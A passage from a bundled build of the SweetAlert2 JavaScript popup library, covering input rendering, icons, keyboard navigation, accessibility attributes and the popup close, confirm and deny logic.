            var attrName = input.attributes[i].name;
            if (!["id", "type", "value", "style"].includes(attrName)) {
              input.removeAttribute(attrName);
            }
          }
        };
        var setAttributes = function setAttributes2(inputClass, inputAttributes) {
          var input = getInput$1(getPopup(), inputClass);
          if (!input) {
            return;
          }
          removeAttributes(input);
          for (var attr in inputAttributes) {
            input.setAttribute(attr, inputAttributes[attr]);
          }
        };
        var setCustomClass = function setCustomClass2(params) {
          var inputContainer = getInputContainer(params.input);
          if (_typeof(params.customClass) === "object") {
            addClass(inputContainer, params.customClass.input);
          }
        };
        var setInputPlaceholder = function setInputPlaceholder2(input, params) {
          if (!input.placeholder || params.inputPlaceholder) {
            input.placeholder = params.inputPlaceholder;
          }
        };
        var setInputLabel = function setInputLabel2(input, prependTo, params) {
          if (params.inputLabel) {
            var label = document.createElement("label");
            var labelClass = swalClasses["input-label"];
            label.setAttribute("for", input.id);
            label.className = labelClass;
            if (_typeof(params.customClass) === "object") {
              addClass(label, params.customClass.inputLabel);
            }
            label.innerText = params.inputLabel;
            prependTo.insertAdjacentElement("beforebegin", label);
          }
        };
        var getInputContainer = function getInputContainer2(inputType) {
          return getDirectChildByClass(getPopup(), swalClasses[inputType] || swalClasses.input);
        };
        var checkAndSetInputValue = function checkAndSetInputValue2(input, inputValue) {
          if (["string", "number"].includes(_typeof(inputValue))) {
            input.value = "".concat(inputValue);
          } else if (!isPromise(inputValue)) {
            warn('Unexpected type of inputValue! Expected "string", "number" or "Promise", got "'.concat(_typeof(inputValue), '"'));
          }
        };
        var renderInputType = {};
        renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = renderInputType.search = renderInputType.date = renderInputType["datetime-local"] = renderInputType.time = renderInputType.week = renderInputType.month = function(input, params) {
          checkAndSetInputValue(input, params.inputValue);
          setInputLabel(input, input, params);
          setInputPlaceholder(input, params);
          input.type = params.input;
          return input;
        };
        renderInputType.file = function(input, params) {
          setInputLabel(input, input, params);
          setInputPlaceholder(input, params);
          return input;
        };
        renderInputType.range = function(range, params) {
          var rangeInput = range.querySelector("input");
          var rangeOutput = range.querySelector("output");
          checkAndSetInputValue(rangeInput, params.inputValue);
          rangeInput.type = params.input;
          checkAndSetInputValue(rangeOutput, params.inputValue);
          setInputLabel(rangeInput, range, params);
          return range;
        };
        renderInputType.select = function(select, params) {
          select.textContent = "";
          if (params.inputPlaceholder) {
            var placeholder = document.createElement("option");
            setInnerHtml(placeholder, params.inputPlaceholder);
            placeholder.value = "";
            placeholder.disabled = true;
            placeholder.selected = true;
            select.appendChild(placeholder);
          }
          setInputLabel(select, select, params);
          return select;
        };
        renderInputType.radio = function(radio) {
          radio.textContent = "";
          return radio;
        };
        renderInputType.checkbox = function(checkboxContainer, params) {
          var checkbox = getInput$1(getPopup(), "checkbox");
          checkbox.value = "1";
          checkbox.checked = Boolean(params.inputValue);
          var label = checkboxContainer.querySelector("span");
          setInnerHtml(label, params.inputPlaceholder);
          return checkbox;
        };
        renderInputType.textarea = function(textarea, params) {
          checkAndSetInputValue(textarea, params.inputValue);
          setInputPlaceholder(textarea, params);
          setInputLabel(textarea, textarea, params);
          var getMargin = function getMargin2(el) {
            return parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
          };
          setTimeout(function() {
            if ("MutationObserver" in window) {
              var initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
              var textareaResizeHandler = function textareaResizeHandler2() {
                if (!document.body.contains(textarea)) {
                  return;
                }
                var textareaWidth = textarea.offsetWidth + getMargin(textarea);
                if (textareaWidth > initialPopupWidth) {
                  getPopup().style.width = "".concat(textareaWidth, "px");
                } else {
                  applyNumericalStyle(getPopup(), "width", params.width);
                }
              };
              new MutationObserver(textareaResizeHandler).observe(textarea, {
                attributes: true,
                attributeFilter: ["style"]
              });
            }
          });
          return textarea;
        };
        var renderContent = function renderContent2(instance, params) {
          var htmlContainer = getHtmlContainer();
          if (!htmlContainer) {
            return;
          }
          showWhenInnerHtmlPresent(htmlContainer);
          applyCustomClass(htmlContainer, params, "htmlContainer");
          if (params.html) {
            parseHtmlToContainer(params.html, htmlContainer);
            show(htmlContainer, "block");
          } else if (params.text) {
            htmlContainer.textContent = params.text;
            show(htmlContainer, "block");
          } else {
            hide(htmlContainer);
          }
          renderInput(instance, params);
        };
        var renderFooter = function renderFooter2(instance, params) {
          var footer = getFooter();
          if (!footer) {
            return;
          }
          showWhenInnerHtmlPresent(footer);
          toggle(footer, params.footer, "block");
          if (params.footer) {
            parseHtmlToContainer(params.footer, footer);
          }
          applyCustomClass(footer, params, "footer");
        };
        var renderIcon = function renderIcon2(instance, params) {
          var innerParams = privateProps.innerParams.get(instance);
          var icon = getIcon();
          if (!icon) {
            return;
          }
          if (innerParams && params.icon === innerParams.icon) {
            setContent(icon, params);
            applyStyles(icon, params);
            return;
          }
          if (!params.icon && !params.iconHtml) {
            hide(icon);
            return;
          }
          if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
            error('Unknown icon! Expected "success", "error", "warning", "info" or "question", got "'.concat(params.icon, '"'));
            hide(icon);
            return;
          }
          show(icon);
          setContent(icon, params);
          applyStyles(icon, params);
          addClass(icon, params.showClass && params.showClass.icon);
        };
        var applyStyles = function applyStyles2(icon, params) {
          for (var _i = 0, _Object$entries = Object.entries(iconTypes); _i < _Object$entries.length; _i++) {
            var _Object$entries$_i = _slicedToArray(_Object$entries[_i], 2), iconType = _Object$entries$_i[0], iconClassName = _Object$entries$_i[1];
            if (params.icon !== iconType) {
              removeClass(icon, iconClassName);
            }
          }
          addClass(icon, params.icon && iconTypes[params.icon]);
          setColor(icon, params);
          adjustSuccessIconBackgroundColor();
          applyCustomClass(icon, params, "icon");
        };
        var adjustSuccessIconBackgroundColor = function adjustSuccessIconBackgroundColor2() {
          var popup = getPopup();
          if (!popup) {
            return;
          }
          var popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
          var successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
          for (var i = 0; i < successIconParts.length; i++) {
            successIconParts[i].style.backgroundColor = popupBackgroundColor;
          }
        };
        var successIconHtml = '\n  <div class="swal2-success-circular-line-left"></div>\n  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>\n  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>\n  <div class="swal2-success-circular-line-right"></div>\n';
        var errorIconHtml = '\n  <span class="swal2-x-mark">\n    <span class="swal2-x-mark-line-left"></span>\n    <span class="swal2-x-mark-line-right"></span>\n  </span>\n';
        var setContent = function setContent2(icon, params) {
          if (!params.icon && !params.iconHtml) {
            return;
          }
          var oldContent = icon.innerHTML;
          var newContent = "";
          if (params.iconHtml) {
            newContent = iconContent(params.iconHtml);
          } else if (params.icon === "success") {
            newContent = successIconHtml;
            oldContent = oldContent.replace(/ style=".*?"/g, "");
          } else if (params.icon === "error") {
            newContent = errorIconHtml;
          } else if (params.icon) {
            var defaultIconHtml = {
              question: "?",
              warning: "!",
              info: "i"
            };
            newContent = iconContent(defaultIconHtml[params.icon]);
          }
          if (oldContent.trim() !== newContent.trim()) {
            setInnerHtml(icon, newContent);
          }
        };
        var setColor = function setColor2(icon, params) {
          if (!params.iconColor) {
            return;
          }
          icon.style.color = params.iconColor;
          icon.style.borderColor = params.iconColor;
          for (var _i2 = 0, _arr = [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]; _i2 < _arr.length; _i2++) {
            var sel = _arr[_i2];
            setStyle(icon, sel, "background-color", params.iconColor);
          }
          setStyle(icon, ".swal2-success-ring", "border-color", params.iconColor);
        };
        var iconContent = function iconContent2(content) {
          return '<div class="'.concat(swalClasses["icon-content"], '">').concat(content, "</div>");
        };
        var renderImage = function renderImage2(instance, params) {
          var image = getImage();
          if (!image) {
            return;
          }
          if (!params.imageUrl) {
            hide(image);
            return;
          }
          show(image, "");
          image.setAttribute("src", params.imageUrl);
          image.setAttribute("alt", params.imageAlt || "");
          applyNumericalStyle(image, "width", params.imageWidth);
          applyNumericalStyle(image, "height", params.imageHeight);
          image.className = swalClasses.image;
          applyCustomClass(image, params, "image");
        };
        var renderPopup = function renderPopup2(instance, params) {
          var container = getContainer();
          var popup = getPopup();
          if (!container || !popup) {
            return;
          }
          if (params.toast) {
            applyNumericalStyle(container, "width", params.width);
            popup.style.width = "100%";
            var loader = getLoader();
            loader && popup.insertBefore(loader, getIcon());
          } else {
            applyNumericalStyle(popup, "width", params.width);
          }
          applyNumericalStyle(popup, "padding", params.padding);
          if (params.color) {
            popup.style.color = params.color;
          }
          if (params.background) {
            popup.style.background = params.background;
          }
          hide(getValidationMessage());
          addClasses$1(popup, params);
        };
        var addClasses$1 = function addClasses2(popup, params) {
          var showClass = params.showClass || {};
          popup.className = "".concat(swalClasses.popup, " ").concat(isVisible$1(popup) ? showClass.popup : "");
          if (params.toast) {
            addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
            addClass(popup, swalClasses.toast);
          } else {
            addClass(popup, swalClasses.modal);
          }
          applyCustomClass(popup, params, "popup");
          if (typeof params.customClass === "string") {
            addClass(popup, params.customClass);
          }
          if (params.icon) {
            addClass(popup, swalClasses["icon-".concat(params.icon)]);
          }
        };
        var renderProgressSteps = function renderProgressSteps2(instance, params) {
          var progressStepsContainer = getProgressSteps();
          if (!progressStepsContainer) {
            return;
          }
          var progressSteps = params.progressSteps, currentProgressStep = params.currentProgressStep;
          if (!progressSteps || progressSteps.length === 0 || currentProgressStep === void 0) {
            hide(progressStepsContainer);
            return;
          }
          show(progressStepsContainer);
          progressStepsContainer.textContent = "";
          if (currentProgressStep >= progressSteps.length) {
            warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
          }
          progressSteps.forEach(function(step, index) {
            var stepEl = createStepElement(step);
            progressStepsContainer.appendChild(stepEl);
            if (index === currentProgressStep) {
              addClass(stepEl, swalClasses["active-progress-step"]);
            }
            if (index !== progressSteps.length - 1) {
              var lineEl = createLineElement(params);
              progressStepsContainer.appendChild(lineEl);
            }
          });
        };
        var createStepElement = function createStepElement2(step) {
          var stepEl = document.createElement("li");
          addClass(stepEl, swalClasses["progress-step"]);
          setInnerHtml(stepEl, step);
          return stepEl;
        };
        var createLineElement = function createLineElement2(params) {
          var lineEl = document.createElement("li");
          addClass(lineEl, swalClasses["progress-step-line"]);
          if (params.progressStepsDistance) {
            applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
          }
          return lineEl;
        };
        var renderTitle = function renderTitle2(instance, params) {
          var title = getTitle();
          if (!title) {
            return;
          }
          showWhenInnerHtmlPresent(title);
          toggle(title, params.title || params.titleText, "block");
          if (params.title) {
            parseHtmlToContainer(params.title, title);
          }
          if (params.titleText) {
            title.innerText = params.titleText;
          }
          applyCustomClass(title, params, "title");
        };
        var render = function render2(instance, params) {
          renderPopup(instance, params);
          renderContainer(instance, params);
          renderProgressSteps(instance, params);
          renderIcon(instance, params);
          renderImage(instance, params);
          renderTitle(instance, params);
          renderCloseButton(instance, params);
          renderContent(instance, params);
          renderActions(instance, params);
          renderFooter(instance, params);
          var popup = getPopup();
          if (typeof params.didRender === "function" && popup) {
            params.didRender(popup);
          }
        };
        var isVisible = function isVisible2() {
          return isVisible$1(getPopup());
        };
        var clickConfirm = function clickConfirm2() {
          var _dom$getConfirmButton;
          return (_dom$getConfirmButton = getConfirmButton()) === null || _dom$getConfirmButton === void 0 ? void 0 : _dom$getConfirmButton.click();
        };
        var clickDeny = function clickDeny2() {
          var _dom$getDenyButton;
          return (_dom$getDenyButton = getDenyButton()) === null || _dom$getDenyButton === void 0 ? void 0 : _dom$getDenyButton.click();
        };
        var clickCancel = function clickCancel2() {
          var _dom$getCancelButton;
          return (_dom$getCancelButton = getCancelButton()) === null || _dom$getCancelButton === void 0 ? void 0 : _dom$getCancelButton.click();
        };
        var DismissReason = Object.freeze({
          cancel: "cancel",
          backdrop: "backdrop",
          close: "close",
          esc: "esc",
          timer: "timer"
        });
        var removeKeydownHandler = function removeKeydownHandler2(globalState2) {
          if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
            globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
              capture: globalState2.keydownListenerCapture
            });
            globalState2.keydownHandlerAdded = false;
          }
        };
        var addKeydownHandler = function addKeydownHandler2(globalState2, innerParams, dismissWith) {
          removeKeydownHandler(globalState2);
          if (!innerParams.toast) {
            globalState2.keydownHandler = function(e) {
              return keydownHandler(innerParams, e, dismissWith);
            };
            globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
            globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
            globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
              capture: globalState2.keydownListenerCapture
            });
            globalState2.keydownHandlerAdded = true;
          }
        };
        var setFocus = function setFocus2(index, increment) {
          var _dom$getPopup;
          var focusableElements = getFocusableElements();
          if (focusableElements.length) {
            index = index + increment;
            if (index === focusableElements.length) {
              index = 0;
            } else if (index === -1) {
              index = focusableElements.length - 1;
            }
            focusableElements[index].focus();
            return;
          }
          (_dom$getPopup = getPopup()) === null || _dom$getPopup === void 0 || _dom$getPopup.focus();
        };
        var arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
        var arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
        var keydownHandler = function keydownHandler2(innerParams, event, dismissWith) {
          if (!innerParams) {
            return;
          }
          if (event.isComposing || event.keyCode === 229) {
            return;
          }
          if (innerParams.stopKeydownPropagation) {
            event.stopPropagation();
          }
          if (event.key === "Enter") {
            handleEnter(event, innerParams);
          } else if (event.key === "Tab") {
            handleTab(event);
          } else if ([].concat(arrowKeysNextButton, arrowKeysPreviousButton).includes(event.key)) {
            handleArrows(event.key);
          } else if (event.key === "Escape") {
            handleEsc(event, innerParams, dismissWith);
          }
        };
        var handleEnter = function handleEnter2(event, innerParams) {
          if (!callIfFunction(innerParams.allowEnterKey)) {
            return;
          }
          var input = getInput$1(getPopup(), innerParams.input);
          if (event.target && input && event.target instanceof HTMLElement && event.target.outerHTML === input.outerHTML) {
            if (["textarea", "file"].includes(innerParams.input)) {
              return;
            }
            clickConfirm();
            event.preventDefault();
          }
        };
        var handleTab = function handleTab2(event) {
          var targetElement = event.target;
          var focusableElements = getFocusableElements();
          var btnIndex = -1;
          for (var i = 0; i < focusableElements.length; i++) {
            if (targetElement === focusableElements[i]) {
              btnIndex = i;
              break;
            }
          }
          if (!event.shiftKey) {
            setFocus(btnIndex, 1);
          } else {
            setFocus(btnIndex, -1);
          }
          event.stopPropagation();
          event.preventDefault();
        };
        var handleArrows = function handleArrows2(key) {
          var actions = getActions();
          var confirmButton = getConfirmButton();
          var denyButton = getDenyButton();
          var cancelButton = getCancelButton();
          if (!actions || !confirmButton || !denyButton || !cancelButton) {
            return;
          }
          var buttons = [confirmButton, denyButton, cancelButton];
          if (document.activeElement instanceof HTMLElement && !buttons.includes(document.activeElement)) {
            return;
          }
          var sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
          var buttonToFocus = document.activeElement;
          if (!buttonToFocus) {
            return;
          }
          for (var i = 0; i < actions.children.length; i++) {
            buttonToFocus = buttonToFocus[sibling];
            if (!buttonToFocus) {
              return;
            }
            if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
              break;
            }
          }
          if (buttonToFocus instanceof HTMLButtonElement) {
            buttonToFocus.focus();
          }
        };
        var handleEsc = function handleEsc2(event, innerParams, dismissWith) {
          if (callIfFunction(innerParams.allowEscapeKey)) {
            event.preventDefault();
            dismissWith(DismissReason.esc);
          }
        };
        var privateMethods = {
          swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
          swalPromiseReject: /* @__PURE__ */ new WeakMap()
        };
        var setAriaHidden = function setAriaHidden2() {
          var container = getContainer();
          var bodyChildren = Array.from(document.body.children);
          bodyChildren.forEach(function(el) {
            if (el.contains(container)) {
              return;
            }
            if (el.hasAttribute("aria-hidden")) {
              el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden") || "");
            }
            el.setAttribute("aria-hidden", "true");
          });
        };
        var unsetAriaHidden = function unsetAriaHidden2() {
          var bodyChildren = Array.from(document.body.children);
          bodyChildren.forEach(function(el) {
            if (el.hasAttribute("data-previous-aria-hidden")) {
              el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden") || "");
              el.removeAttribute("data-previous-aria-hidden");
            } else {
              el.removeAttribute("aria-hidden");
            }
          });
        };
        var isSafariOrIOS = typeof window !== "undefined" && !!window.GestureEvent;
        var iOSfix = function iOSfix2() {
          if (isSafariOrIOS && !hasClass(document.body, swalClasses.iosfix)) {
            var offset = document.body.scrollTop;
            document.body.style.top = "".concat(offset * -1, "px");
            addClass(document.body, swalClasses.iosfix);
            lockBodyScroll();
          }
        };
        var lockBodyScroll = function lockBodyScroll2() {
          var container = getContainer();
          if (!container) {
            return;
          }
          var preventTouchMove;
          container.ontouchstart = function(event) {
            preventTouchMove = shouldPreventTouchMove(event);
          };
          container.ontouchmove = function(event) {
            if (preventTouchMove) {
              event.preventDefault();
              event.stopPropagation();
            }
          };
        };
        var shouldPreventTouchMove = function shouldPreventTouchMove2(event) {
          var target = event.target;
          var container = getContainer();
          var htmlContainer = getHtmlContainer();
          if (!container || !htmlContainer) {
            return false;
          }
          if (isStylus(event) || isZoom(event)) {
            return false;
          }
          if (target === container) {
            return true;
          }
          if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
          target.tagName !== "TEXTAREA" && // #2266
          !(isScrollable(htmlContainer) && // #1944
          htmlContainer.contains(target))) {
            return true;
          }
          return false;
        };
        var isStylus = function isStylus2(event) {
          return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
        };
        var isZoom = function isZoom2(event) {
          return event.touches && event.touches.length > 1;
        };
        var undoIOSfix = function undoIOSfix2() {
          if (hasClass(document.body, swalClasses.iosfix)) {
            var offset = parseInt(document.body.style.top, 10);
            removeClass(document.body, swalClasses.iosfix);
            document.body.style.top = "";
            document.body.scrollTop = offset * -1;
          }
        };
        var measureScrollbar = function measureScrollbar2() {
          var scrollDiv = document.createElement("div");
          scrollDiv.className = swalClasses["scrollbar-measure"];
          document.body.appendChild(scrollDiv);
          var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
          document.body.removeChild(scrollDiv);
          return scrollbarWidth;
        };
        var previousBodyPadding = null;
        var replaceScrollbarWithPadding = function replaceScrollbarWithPadding2(initialBodyOverflow) {
          if (previousBodyPadding !== null) {
            return;
          }
          if (document.body.scrollHeight > window.innerHeight || initialBodyOverflow === "scroll") {
            previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
            document.body.style.paddingRight = "".concat(previousBodyPadding + measureScrollbar(), "px");
          }
        };
        var undoReplaceScrollbarWithPadding = function undoReplaceScrollbarWithPadding2() {
          if (previousBodyPadding !== null) {
            document.body.style.paddingRight = "".concat(previousBodyPadding, "px");
            previousBodyPadding = null;
          }
        };
        function removePopupAndResetState(instance, container, returnFocus, didClose) {
          if (isToast()) {
            triggerDidCloseAndDispose(instance, didClose);
          } else {
            restoreActiveElement(returnFocus).then(function() {
              return triggerDidCloseAndDispose(instance, didClose);
            });
            removeKeydownHandler(globalState);
          }
          if (isSafariOrIOS) {
            container.setAttribute("style", "display:none !important");
            container.removeAttribute("class");
            container.innerHTML = "";
          } else {
            container.remove();
          }
          if (isModal()) {
            undoReplaceScrollbarWithPadding();
            undoIOSfix();
            unsetAriaHidden();
          }
          removeBodyClasses();
        }
        function removeBodyClasses() {
          removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
        }
        function close(resolveValue) {
          resolveValue = prepareResolveValue(resolveValue);
          var swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
          var didClose = triggerClosePopup(this);
          if (this.isAwaitingPromise) {
            if (!resolveValue.isDismissed) {
              handleAwaitingPromise(this);
              swalPromiseResolve(resolveValue);
            }
          } else if (didClose) {
            swalPromiseResolve(resolveValue);
          }
        }
        var triggerClosePopup = function triggerClosePopup2(instance) {
          var popup = getPopup();
          if (!popup) {
            return false;
          }
          var innerParams = privateProps.innerParams.get(instance);
          if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
            return false;
          }
          removeClass(popup, innerParams.showClass.popup);
          addClass(popup, innerParams.hideClass.popup);
          var backdrop = getContainer();
          removeClass(backdrop, innerParams.showClass.backdrop);
          addClass(backdrop, innerParams.hideClass.backdrop);
          handlePopupAnimation(instance, popup, innerParams);
          return true;
        };
        function rejectPromise(error2) {
          var rejectPromise2 = privateMethods.swalPromiseReject.get(this);
          handleAwaitingPromise(this);
          if (rejectPromise2) {
            rejectPromise2(error2);
          }
        }
        var handleAwaitingPromise = function handleAwaitingPromise2(instance) {
          if (instance.isAwaitingPromise) {
            delete instance.isAwaitingPromise;
            if (!privateProps.innerParams.get(instance)) {
              instance._destroy();
            }
          }
        };
        var prepareResolveValue = function prepareResolveValue2(resolveValue) {
          if (typeof resolveValue === "undefined") {
            return {
              isConfirmed: false,
              isDenied: false,
              isDismissed: true
            };
          }
          return Object.assign({
            isConfirmed: false,
            isDenied: false,
            isDismissed: false
          }, resolveValue);
        };
        var handlePopupAnimation = function handlePopupAnimation2(instance, popup, innerParams) {
          var container = getContainer();
          var animationIsSupported = animationEndEvent && hasCssAnimation(popup);
          if (typeof innerParams.willClose === "function") {
            innerParams.willClose(popup);
          }
          if (animationIsSupported) {
            animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
          } else {
            removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
          }
        };
        var animatePopup = function animatePopup2(instance, popup, container, returnFocus, didClose) {
          if (!animationEndEvent) {
            return;
          }
          globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
          popup.addEventListener(animationEndEvent, function(e) {
            if (e.target === popup) {
              globalState.swalCloseEventFinishedCallback();
              delete globalState.swalCloseEventFinishedCallback;
            }
          });
        };
        var triggerDidCloseAndDispose = function triggerDidCloseAndDispose2(instance, didClose) {
          setTimeout(function() {
            if (typeof didClose === "function") {
              didClose.bind(instance.params)();
            }
            if (instance._destroy) {
              instance._destroy();
            }
          });
        };
        var showLoading = function showLoading2(buttonToReplace) {
          var popup = getPopup();
          if (!popup) {
            new Swal2();
          }
          popup = getPopup();
          if (!popup) {
            return;
          }
          var loader = getLoader();
          if (isToast()) {
            hide(getIcon());
          } else {
            replaceButton(popup, buttonToReplace);
          }
          show(loader);
          popup.setAttribute("data-loading", "true");
          popup.setAttribute("aria-busy", "true");
          popup.focus();
        };
        var replaceButton = function replaceButton2(popup, buttonToReplace) {
          var actions = getActions();
          var loader = getLoader();
          if (!actions || !loader) {
            return;
          }
          if (!buttonToReplace && isVisible$1(getConfirmButton())) {
            buttonToReplace = getConfirmButton();
          }
          show(actions);
          if (buttonToReplace) {
            hide(buttonToReplace);
            loader.setAttribute("data-button-to-replace", buttonToReplace.className);
            actions.insertBefore(loader, buttonToReplace);
          }
          addClass([popup, actions], swalClasses.loading);
        };
        var handleInputOptionsAndValue = function handleInputOptionsAndValue2(instance, params) {
          if (params.input === "select" || params.input === "radio") {
            handleInputOptions(instance, params);
          } else if (["text", "email", "number", "tel", "textarea"].some(function(i) {
            return i === params.input;
          }) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
            showLoading(getConfirmButton());
            handleInputValue(instance, params);
          }
        };
        var getInputValue = function getInputValue2(instance, innerParams) {
          var input = instance.getInput();
          if (!input) {
            return null;
          }
          switch (innerParams.input) {
            case "checkbox":
              return getCheckboxValue(input);
            case "radio":
              return getRadioValue(input);
            case "file":
              return getFileValue(input);
            default:
              return innerParams.inputAutoTrim ? input.value.trim() : input.value;
          }
        };
        var getCheckboxValue = function getCheckboxValue2(input) {
          return input.checked ? 1 : 0;
        };
        var getRadioValue = function getRadioValue2(input) {
          return input.checked ? input.value : null;
        };
        var getFileValue = function getFileValue2(input) {
          return input.files && input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
        };
        var handleInputOptions = function handleInputOptions2(instance, params) {
          var popup = getPopup();
          if (!popup) {
            return;
          }
          var processInputOptions = function processInputOptions2(inputOptions) {
            if (params.input === "select") {
              populateSelectOptions(popup, formatInputOptions(inputOptions), params);
            } else if (params.input === "radio") {
              populateRadioOptions(popup, formatInputOptions(inputOptions), params);
            }
          };
          if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
            showLoading(getConfirmButton());
            asPromise(params.inputOptions).then(function(inputOptions) {
              instance.hideLoading();
              processInputOptions(inputOptions);
            });
          } else if (_typeof(params.inputOptions) === "object") {
            processInputOptions(params.inputOptions);
          } else {
            error("Unexpected type of inputOptions! Expected object, Map or Promise, got ".concat(_typeof(params.inputOptions)));
          }
        };
        var handleInputValue = function handleInputValue2(instance, params) {
          var input = instance.getInput();
          if (!input) {
            return;
          }
          hide(input);
          asPromise(params.inputValue).then(function(inputValue) {
            input.value = params.input === "number" ? "".concat(parseFloat(inputValue) || 0) : "".concat(inputValue);
            show(input);
            input.focus();
            instance.hideLoading();
          })["catch"](function(err) {
            error("Error in inputValue promise: ".concat(err));
            input.value = "";
            show(input);
            input.focus();
            instance.hideLoading();
          });
        };
        function populateSelectOptions(popup, inputOptions, params) {
          var select = getDirectChildByClass(popup, swalClasses.select);
          if (!select) {
            return;
          }
          var renderOption = function renderOption2(parent, optionLabel, optionValue) {
            var option = document.createElement("option");
            option.value = optionValue;
            setInnerHtml(option, optionLabel);
            option.selected = isSelected(optionValue, params.inputValue);
            parent.appendChild(option);
          };
          inputOptions.forEach(function(inputOption) {
            var optionValue = inputOption[0];
            var optionLabel = inputOption[1];
            if (Array.isArray(optionLabel)) {
              var optgroup = document.createElement("optgroup");
              optgroup.label = optionValue;
              optgroup.disabled = false;
              select.appendChild(optgroup);
              optionLabel.forEach(function(o) {
                return renderOption(optgroup, o[1], o[0]);
              });
            } else {
              renderOption(select, optionLabel, optionValue);
            }
          });
          select.focus();
        }
        function populateRadioOptions(popup, inputOptions, params) {
          var radio = getDirectChildByClass(popup, swalClasses.radio);
          if (!radio) {
            return;
          }
          inputOptions.forEach(function(inputOption) {
            var radioValue = inputOption[0];
            var radioLabel = inputOption[1];
            var radioInput = document.createElement("input");
            var radioLabelElement = document.createElement("label");
            radioInput.type = "radio";
            radioInput.name = swalClasses.radio;
            radioInput.value = radioValue;
            if (isSelected(radioValue, params.inputValue)) {
              radioInput.checked = true;
            }
            var label = document.createElement("span");
            setInnerHtml(label, radioLabel);
            label.className = swalClasses.label;
            radioLabelElement.appendChild(radioInput);
            radioLabelElement.appendChild(label);
            radio.appendChild(radioLabelElement);
          });
          var radios = radio.querySelectorAll("input");
          if (radios.length) {
            radios[0].focus();
          }
        }
        var formatInputOptions = function formatInputOptions2(inputOptions) {
          var result = [];
          if (inputOptions instanceof Map) {
            inputOptions.forEach(function(value, key) {
              var valueFormatted = value;
              if (_typeof(valueFormatted) === "object") {
                valueFormatted = formatInputOptions2(valueFormatted);
              }
              result.push([key, valueFormatted]);
            });
          } else {
            Object.keys(inputOptions).forEach(function(key) {
              var valueFormatted = inputOptions[key];
              if (_typeof(valueFormatted) === "object") {
                valueFormatted = formatInputOptions2(valueFormatted);
              }
              result.push([key, valueFormatted]);
            });
          }
          return result;
        };
        var isSelected = function isSelected2(optionValue, inputValue) {
          return !!inputValue && inputValue.toString() === optionValue.toString();
        };
        var _this = void 0;
        var handleConfirmButtonClick = function handleConfirmButtonClick2(instance) {
          var innerParams = privateProps.innerParams.get(instance);
          instance.disableButtons();
          if (innerParams.input) {
            handleConfirmOrDenyWithInput(instance, "confirm");
          } else {
            confirm(instance, true);
          }
        };
        var handleDenyButtonClick = function handleDenyButtonClick2(instance) {
          var innerParams = privateProps.innerParams.get(instance);
          instance.disableButtons();
          if (innerParams.returnInputValueOnDeny) {
            handleConfirmOrDenyWithInput(instance, "deny");
          } else {
            deny(instance, false);
          }
        };
        var handleCancelButtonClick = function handleCancelButtonClick2(instance, dismissWith) {
          instance.disableButtons();
          dismissWith(DismissReason.cancel);
        };
        var handleConfirmOrDenyWithInput = function handleConfirmOrDenyWithInput2(instance, type) {
          var innerParams = privateProps.innerParams.get(instance);
          if (!innerParams.input) {
            error('The "input" parameter is needed to be set when using returnInputValueOn'.concat(capitalizeFirstLetter(type)));
            return;
          }
          var input = instance.getInput();
          var inputValue = getInputValue(instance, innerParams);
          if (innerParams.inputValidator) {
            handleInputValidator(instance, inputValue, type);
          } else if (input && !input.checkValidity()) {
            instance.enableButtons();
            instance.showValidationMessage(innerParams.validationMessage || input.validationMessage);
          } else if (type === "deny") {
            deny(instance, inputValue);
          } else {
            confirm(instance, inputValue);
          }
        };
        var handleInputValidator = function handleInputValidator2(instance, inputValue, type) {
          var innerParams = privateProps.innerParams.get(instance);
          instance.disableInput();
          var validationPromise = Promise.resolve().then(function() {
            return asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage));
          });
          validationPromise.then(function(validationMessage) {
            instance.enableButtons();
            instance.enableInput();
            if (validationMessage) {
              instance.showValidationMessage(validationMessage);
            } else if (type === "deny") {
              deny(instance, inputValue);
            } else {
              confirm(instance, inputValue);
            }
          });
        };
        var deny = function deny2(instance, value) {
          var innerParams = privateProps.innerParams.get(instance || _this);
          if (innerParams.showLoaderOnDeny) {
            showLoading(getDenyButton());
          }
